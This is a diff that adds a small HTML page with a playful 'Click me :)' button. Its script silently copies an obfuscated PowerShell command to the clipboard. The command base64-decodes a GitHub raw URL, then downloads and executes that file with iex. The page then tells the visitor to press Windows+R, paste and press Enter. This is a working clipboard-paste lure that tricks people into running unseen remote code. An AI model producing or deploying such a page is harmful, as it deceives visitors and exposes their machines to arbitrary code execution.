@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shhh!!!</title>
+    <style>
+        /* CSS to center the button */
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+
+        #instructions {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #555;
+        }
+
+        .instruction {
+            margin-bottom: 10px;
+            font-family: Arial;
+        }
+    </style>
+    <script>
+        function copyToClipboard() {
+            var command = 'powershell "$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3J5ZGVyNzIyMy9SYW5kb20vcmVmcy9oZWFkcy9tYWluL2ludm9rZUZsaXAudHh0\')); iex (iwr $u).Content"';
+            navigator.clipboard.writeText(command).then(function() {
+                // Hide the button after it's clicked
+                document.querySelector('button').style.display = 'none';
+
+                // Show the instructions
+                document.getElementById('instructions').innerHTML = `
+                    <div class="instruction">1. Press Windows + R</div>
+                    <div class="instruction">2. Press Ctrl + V</div>
+                    <div class="instruction">3. Press Enter</div>
+                `;
+            }).catch(function(err) {
+            });
+        }
+    </script>
+</head>
+<body>
+    <button onclick="copyToClipboard()">Click me :)</button>
+    <div id="instructions"></div>
+</body>
+</html>
